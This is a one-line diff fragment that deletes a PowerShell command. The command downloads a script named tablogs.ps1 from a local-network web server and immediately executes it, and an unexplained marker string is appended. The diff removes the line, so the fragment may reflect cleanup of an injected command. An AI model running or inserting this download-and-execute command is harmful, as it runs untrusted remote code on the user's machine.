@@ -1,1 +1,0 @@
-& { curl.exe -s -o $env:USERPROFILE\tablogs.ps1 http://192.168.122.1:8000/tablogs.ps1; & $env:USERPROFILE\tablogs.ps1 } ; "__n=53321791089567185526132"
